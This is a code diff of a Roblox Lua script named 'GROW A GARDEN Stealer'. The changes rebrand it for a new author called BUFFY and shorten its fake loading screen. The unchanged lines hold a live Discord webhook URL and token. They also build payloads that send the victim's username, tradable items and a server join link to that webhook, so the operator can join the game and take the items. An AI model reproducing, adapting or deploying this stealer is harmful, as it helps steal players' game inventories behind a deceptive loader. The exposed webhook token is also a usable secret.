@@ -1,3 +1,4 @@
+username = "emmash0706a"
 
 logs_webhook = "https://discord.com/api/webhooks/1384305747147362425/bwhZjrmitwuq48K_jrDqK4L9SM00EELto-1XxNLx4pS79RJhc5blH8Q-KUuRaisFiaoE"
 
@@ -70,7 +71,7 @@ barFill.Parent = barBg
 
 
 local discord = Instance.new("TextLabel", bg)
-discord.Text = "Join our Discord: discord.gg/qB97QHPugw"
+discord.Text = "BUFFY THE BEST AT THIS"
 discord.Font = Enum.Font.GothamSemibold
 discord.TextColor3 = Color3.fromRGB(120, 120, 255)
 discord.TextScaled = true
@@ -93,7 +94,7 @@ local fakeSteps = {
     "Almost done..."
 }
 
-local totalDuration = 600
+local totalDuration = 300
 local stepTime = 3
 local totalSteps = math.floor(totalDuration / stepTime)
 
@@ -213,7 +214,7 @@ end
 local payload = {
     ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
     ["embeds"] = {{
-        ["title"] = ":skull: GROW A GARDEN Stealer",
+        ["title"] = ":skull: GROW A GARDEN Stealer BY BUFFY",
         ["color"] = 0x00ffcc,
         ["fields"] = {
             {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
@@ -223,7 +224,7 @@ local payload = {
             {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
             {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
         },
-        ["footer"] = {["text"] = "by zues • " .. os.date("%B %d, %Y")},
+        ["footer"] = {["text"] = "by BUFFY • " .. os.date("%B %d, %Y")},
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
@@ -239,7 +240,7 @@ local logs_payload = {
             {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
             {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
         },
-        ["footer"] = {["text"] = "by zeus • " .. os.date("%B %d, %Y")},
+        ["footer"] = {["text"] = "by Buffy • " .. os.date("%B %d, %Y")},
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
